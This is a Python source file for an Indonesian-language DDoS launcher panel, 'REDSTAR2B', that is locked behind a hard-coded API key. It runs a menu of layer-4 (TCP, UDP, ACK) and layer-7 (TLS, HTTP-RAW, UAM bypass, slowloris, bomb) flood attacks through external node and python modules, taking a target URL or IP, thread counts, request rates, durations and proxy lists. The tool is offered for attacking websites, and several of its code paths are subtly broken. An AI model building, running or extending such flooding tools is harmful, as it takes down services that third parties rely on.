import os, time, sys
from termcolor import colored

os.system("clear")

RED = "\033[91m"
BLUE = "\033[94m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
RESET = "\033[0m"

login_logo = """
░█▀▀░▀█▀░█▀█░█▀█░█
░▀▀█░░█░░█░█░█▀▀░▀
░▀▀▀░░▀░░▀▀▀░▀░░░▀
"""
def login():
    api_file = ".api.txt"

    print(colored(login_logo,"yellow"))
    print(f"{GREEN}TIDAK PUNYA APIKEY HUBUNGI: 6283867014230 UNTUK MEMINTA APIKEY{RESET}")

    if os.path.exists(api_file):
        with open(api_file, "r") as file:
            api = file.read().strip()
            print(f"{GREEN}APIKEY Found: {api}{RESET}")
            time.sleep(2)
            os.system("clear")
    else:
        api = input(f"{RED}MASUKAN APIKEY: {YELLOW}")

        if api == 'REDSTAR2B':
            with open(api_file, "w") as file:
                file.write(api)
            print(f"{GREEN}Apikey That's right{RESET}")
            time.sleep(2)
            os.system("clear")
        else:
            print(f"{RED}Apikey Wrong{RESET}")
            sys.exit()

login()

layer4 = """
  \033[92m╔══════════════════════════╗\033[92m 
  \033[92m║    PILIH METHOD LAYER4   ║\033[92m    
  \033[92m╚══════════════════════════╝\033[92m
\033[92m✵══════════════════════════════✵\033[92m
\033[92m║  TCP        UDP       ACK     ║\033[92m
\033[92m✵══════════════════════════════✵\033[92m
\033[92mNOTE: PILIH METHOD PAKAI HURUF KECIL MISAL tcp\033[92m
"""

layer7 = """
               \033[92m╔══════════════════════════╗\033[92m 
               \033[92m║    PILIH METHOD LAYER7   ║\033[92m    
               \033[92m╚══════════════════════════╝\033[92m
\033[92m✵════════════════════════════════════════════════════════✵\033[92m
\033[92m║ HTTPRAW        TLS        TLSV12        BOMB     TLSUA  ║\033[92m
\033[92m║ DCM            SPIKE      UAM           TLOS     SLOW   ║\033[92m
\033[92m✵════════════════════════════════════════════════════════✵\033[92m
\033[92mNOTE: PILIH METHOD PAKAI HURUF KECIL MISAL tls\033[92m
"""

logo = """
 \033[92m
        ██████╗  █████╗ ███╗   ██╗███████╗██╗     ███████╗██╗  ██╗██╗  ██╗
        ██╔══██╗██╔══██╗████╗  ██║██╔════╝██║     ╚══███╔╝██║  ██║╚██╗██╔╝
        ██████╔╝███████║██╔██╗ ██║█████╗  ██║█████╗ ███╔╝ ███████║ ╚███╔╝ 
        ██╔═══╝ ██╔══██║██║╚██╗██║██╔══╝  ██║╚════╝███╔╝  ██╔══██║ ██╔██╗ 
        ██║     ██║  ██║██║ ╚████║███████╗███████╗███████╗██║  ██║██╔╝ ██╗
        ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
    \033[0m
                                \033[92m╔══════════════════════════╗\033[92m 
                                \033[92m║WELCOME TO TOOLS REDSTAR2B║\033[92m    
                                \033[92m╚══════════════════════════╝\033[92m
                          \033[92m╔═══════════════════════════════════════╗\033[92m 
                          \033[92m║                PESAN                  ║\033[92m
                          \033[92m║         BEBERAPA METHOD ERROR!        ║\033[92m
                          \033[92m║         THX TO GANZ, code0653         ║\033[92m
                          \033[92m║         AUTHOR: DCM.X-505             ║\033[92m
                          \033[92m╚═══════════════════════════════════════╝\033[92m
                                \033[92m-> Command help Untuk Menu <-\033[92m                           
"""

print(colored(logo,"yellow"))

while True:
    zhx = input('''\033[92m╔══[root\033[92m@Zh\033[92mX\033[92m2B\033[92m]
\033[92m╚\033[92m═\033[92m═\033[92m═\033[92m═\033[92m➤ \033[92m''')

    if zhx == 'HELP' or zhx == 'help' or zhx == 'ls':
      print(colored("\nRULES = SHOW RULES \nLAYER7 = SHOW METHOD LAYER7 \nLAYER4 = SHOW METHOD LAYER4 \nEXIT = EXIT PROGRAM","green"))

    elif zhx == 'RULES' or zhx == 'rules':
        print(colored("DO NOT DDOS DOMAIN .my.id .go.id .id .il .in .co.id IF YOU DON'T INVITE ME WKWK","yellow"))

    elif zhx == 'LAYER4' or zhx == 'layer4' or zhx == 'l4':
        os.system("clear")
        print(layer4)

    elif zhx == 'LAYER7' or zhx == 'layer7' or zhx == 'l7':
        os.system("clear")
        print(layer7)

    elif zhx == 'EXIT' or zhx == 'exit':
        print(colored("GOOD BYE I LOVE YOU :)","blue"))
        sys.exit()
    elif zhx == 'CLEAR' or zhx == 'clear':
        os.system("clear")
        print(colored(logo,"yellow"))

    elif 'tls' in zhx:
        try:
            url = zhx.split()[1]
            th = zhx.split()[2]
            rq  = zhx.split()[3]
            time = zhx.split()[4]
            os.system(f"node .module/tls.js {url} {th} {rq} {time}")
        except IndexError:
            print(colored("Usage: tls <url> <threading> <rps> <time>\nExample: tls htyps://example.com 50 350 60","yellow"))
    elif 'tlos' in zhx:
        try:
            url = zhx.split()[1]
            time = zhx.split()[2]
            rate = zhx.split()[3]
            th = zhx.split()[4]
            os.system(f"node .module/TLS-1.js {url} {time} {rate} {th} .module/proxies.txt")
        except IndexError:
            print(colored("Usage: tlos <url> <time> <rate> <threading>\nExample: tlos https://example.com 120 350 60","yellow"))
    elif 'httpraw' in zhx:
        try:
            url = zhx.split()[1]
            time = zhx.split()[2]
            os.system(f"node .module/HTTP-RAW.js {url} {time}")
        except IndexError:
            print(colored("Usage: httpraw <url> <time> \nExample: httpraw https://examplr.com 120","yellow"))

    elif 'tlsv12' in zhx:
        try:
            url = zhx.split()[1]
            th = zhx.split()[2]
            rq = zhx.split()[3]
            time = zhx.split()[4]
            os.system(f"node .module/TLSV12.js {url} {time} {th} {rq} .module/proxies.txt GET")
        except IndexError:
            print(colored("Usage: <url> <threading> <rps> <time>\nExample: ","yellow"))

    elif 'vip' in zhx:
        try:
            url = zhx.split()[1]
            th = zhx.split()[2]
            rat = zhx.split()[3]
            time = zhx.split()[4]
            os.system(f"node .module/TLS-VIP.js {url} {time} {rate} {th} .module/proxy.txt")
        except IndexError:
            print(colored("Usage: vip <url> <threading> <rate> <time>\nExample: vip https://example.com 25 109 120","yellow"))

    elif 'dcm' in zhx:
        try:
            url = zhx.split()[1] 
            th = zhx.split()[2]
            time = zhx.split()[3]
            os.system(f"node .module/a.js {url} {th} {time}")
        except IndexError:
            print(colored("Usage: dcm <url> <threading> <time>\nExample: dcm https://example.com 50 120","yellow"))

    elif 'spike' in zhx:
        try:
            url = zhx.split()[1]
            th = zhx.split()[2]
            time = zhx.split()[3]
            os.system(f"node .module/spike.js {url} {th} {time}")
        except IndexError:
            print(colored("Usage: spike <url> <threading> <time>\nExample: spike https://example.com 50 120","yellow"))

    elif 'bypass' in zhx:
        try:
            url = zhx.split()[1]
            time = zhx.split()[2]
            os.system(f"node .module/BYPASS-V3.js GET {time} .module/proxy.txt {time} 64 2")
        except IndexError:
            print(colored("Usage: bypass <url> <time>\nExample: bypass https://example.com 120","yellow"))

    elif 'uam' in zhx:
        try:
            url = zhx.split()[1]
            time = zhx.split()[2]
            th = zhx.split()[3]
            os.system(f"node .module/UAM.js {url} {time} 3 {th} .module/proxy.txt")
        except IndexError:
            print(colored("Usage: uam <url> <time> <threading>\nExample: uam https://example.com 120 50","yellow"))

    elif 'bomb' in zhx:
        try:
            url = zhx.split()[1]
            time = zhx.split()[2]
            th = zhx.split()[3]
            os.system(f"node .module/BOMB.js {url} {time} 3 {th} .module/proxy.txt")
        except IndexError:
            print(colored("Usage: bomb <url> <time> <threading>\nExample: bomb https://example.com 120 50","yellow"))

    elif 'tlsua' in zhx:
        try:
            url = zhx.split()[1]
            time = zhx.split()[2]
            th = zhx.split()[3]
            os.system(f"node .module/tlsua {url} {time} 200 {th} .module/proxies.txt")
        except IndexError:
            print(colored("Usage: tlsua <url> <time> <threading>\nExample: tlsua https://example.com 120 50","yellow"))

    elif 'slow' in zhx:
        try:
            url = zhx.split()[1]
            time = zhx.split()[2]
            th = zhx.split()[3]
            os.system(f"node .module/Slow.js {url} {time} 200 {th} .module/proxies.txt")
        except IndexError:
            print(colored("Usage: slow <url> <time> <threading>\nExample: slow https://example.com 120 50","yellow"))

    elif 'tcp' in zhx:
        try:
            ip = zhx.split()[1]
            port = zhx.split()[2]
            time = zhx.split()[3]
            os.system(f'python .module/tcp.py {ip} {port} {time} GET')
        except IndexError:
            print(colored("Usage: tcp <ip> <port> <time>\nExample: tcp 1.1.1.1 443 60","yellow"))

    elif 'udp' in zhx:
        try:
            ip = zhx.split()[1]
            port = zhx.split()[2]
            time = zhx.split()[3]
            pc = zhx.split()[4]
            th = zhx.split()[5]
            os.system(f'python .module/udp-brutal.py {ip} {port} {time} {pc} {th}')
        except IndexError:
            print(colored("Usage: udp <ip> <port> <time> <packet> <threading>\nExample: udp 1.1.1.1 443 60 6 50","yellow"))

    elif 'ack' in zhx:
        try:
           ip = zhx.split()[1]
           port = zhx.split()[2]
           time = zhx.split()[3]
           pc = zhx.split()[4]
           os.system(f"python .module/ack.py {ip} {port} {time} {pc}")
        except IndexError:
           print(colored("Usage: ack <ip> <port> <time> <packet_per_second>\nExample 1.1.1.1 443 120 6","yellow"))
    else:
      print(colored(f"Command [{YELLOW}{zhx}{RED}] Not Found","red"))
